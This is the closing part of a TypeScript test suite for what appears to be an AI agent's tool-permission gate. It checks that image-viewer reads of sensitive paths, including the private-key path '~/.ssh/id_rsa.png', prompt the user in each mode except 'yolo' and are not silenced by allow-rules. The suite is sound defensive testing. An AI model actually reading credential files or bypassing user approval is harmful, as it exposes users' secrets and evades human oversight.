        && auto.asked[0]?.riskReason === `reads a sensitive path: ${filePath}`
        && auto.asked[0]?.suggestions.length === 0
        && auto.asked[0]?.details.every((detail) => detail.label !== 'Classifier'),
    );

    const yolo = await runGate({ mode: 'yolo', allowRules, classifier: saysSafe }, 'imageViewer', input);
    assert(`yolo proceeds without asking: ${filePath}`, yolo.action.type === 'proceed' && yolo.asked.length === 0);

    const widened = await runGate({ mode: 'default', allowRules }, 'imageViewer', input, false);
    assert(
      `an allow-rule does not silence it: ${filePath}`,
      widened.action.type === 'deny' && widened.asked.length === 1
        && widened.asked[0]?.suggestions.length === 0
        && actionReason(widened.action).includes('The user denied permission'),
    );
  }
  assert('no sensitive image consulted the classifier', classifierCalls === 0);

  const refused = await runGate(
    { mode: 'plan', allowRules, classifier: saysSafe },
    'imageViewer',
    { path: '~/.ssh/id_rsa.png' },
    false,
  );
  assert(
    'plan refusal is the user denial, not a plan denial',
    refused.action.type === 'deny' && refused.asked.length === 1
      && actionReason(refused.action).includes('The user denied permission')
      && !actionReason(refused.action).includes('Plan mode blocked')
      && classifierCalls === 0,
  );

  const ordinary = await runGate(
    { mode: 'plan', allowRules, classifier: saysSafe },
    'imageViewer',
    { path: 'screenshots/error.png' },
  );
  assert(
    'plan still lets a project screenshot proceed without asking',
    ordinary.action.type === 'proceed' && ordinary.asked.length === 0 && classifierCalls === 0,
  );
}

async function main(): Promise<void> {
  staticRules();
  sensitiveReads();
  gitPathspecs();
  imageViewerReads();
  aliasedReads();
  allowRules();
  await gateModes();
  await gateRules();
  await gateProvenance();
  await gateSensitiveReads();
  await gateGitPathspecs();
  await gateImageViewerReads();
  await gateAliasedReads();
  report();
}

await main();
